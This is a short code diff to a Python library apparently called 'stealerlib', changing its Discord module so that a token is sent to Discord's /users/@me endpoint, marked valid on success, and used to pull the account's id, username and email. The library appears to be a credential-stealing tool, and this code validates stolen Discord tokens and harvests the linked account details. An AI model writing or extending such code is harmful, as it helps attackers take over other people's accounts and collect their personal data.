@@ -5,6 +5,9 @@
 """
 
 from stealerlib.apps.discord import *
+from stealerlib.request import HTTPHandler
+
+API = HTTPHandler(base="https://discord.com/api/v9/")
 
 
 class DiscordTypes:
@@ -31,15 +34,17 @@ class DiscordTypes:
     @dataclass
     class Token:
         token: str
+        valid: bool=False
 
         def get_information(self):
-            r = requests.get(
-                "https://discord.com/api/v9/users/@me",
+            resp = API.get(
+                endpoint="/users/@me",
                 headers={'Authorization': self.token}
             )
 
-            if r.status_code == 200:
-                obj_r = r.json()
+            if resp.status_code == 200:
+                self.valid = True
+                obj_r = resp.json()
                 id = obj_r['id']
                 username = obj_r['username']
                 email = obj_r['email']
